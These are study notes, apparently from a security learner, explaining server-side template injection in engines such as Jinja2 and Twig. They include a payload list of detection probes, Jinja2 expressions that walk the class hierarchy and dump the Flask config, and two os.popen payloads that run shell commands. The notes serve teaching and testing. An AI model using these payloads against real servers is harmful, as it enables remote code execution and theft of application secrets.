
### **What is SSTI -- ( Server side Template injection ) ?** 
-  **SSTI = Server-Side Template Injection**

- **Injection** into **templates** that run on the **server**    
- Templates are used to generate HTML (like PHP, Jinja2, Twig)
- You inject code that gets **executed during template rendering**
#### **Before understanding wat is SSTI, lets understand Template Engine ?**
-  So it allows us to **separate the presentation layer from the logic layer in our application**, we can insert variables or sometimes even add complex logic directly into the templates. which then gets rendered into the website through **HTML.**.

- Or **it is used to dynamically generate HTML, XML or other formats. While they often have sandboxing features to limit the effects of template injection, these can sometimes be bypassed.**

- There are many types of Template Injection, which can occur in different template engines, including:
	- Server-side Template Injection (SSTI)
	- AngularJS Template Injection
	- Jinja2 Template Injection
	- Twig Template Injection
	- Freemarker Template Injection
	- Django Template Injection

#### Simple Diagram : 

```
Normal: 
User Input → Template Engine → Safe HTML Output
           ↓
        "Hello {{name}}"

Attack:
Malicious Input → Template Engine → Executes Code!
           ↓
        "{{7*7}}" → Outputs "49" (calculation done!)
```

#### **Payloads :**

```markdown

====================================

1. Basic Detection:

${7*7}
{{7*7}}
<%= 7*7 %>
${"z".join("ab")}

====================================

2. Python (Jinja2) - MOST IMPORTANT:

{{config}}                    # Flask config
{{''.__class__}}             # Get string class
{{''.__class__.__base__.__subclasses__()}}  # All classes
{{''.__class__.__mro__[1].__subclasses__()}} # Better

====================================

3. Command Execution:
   
   {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
















```


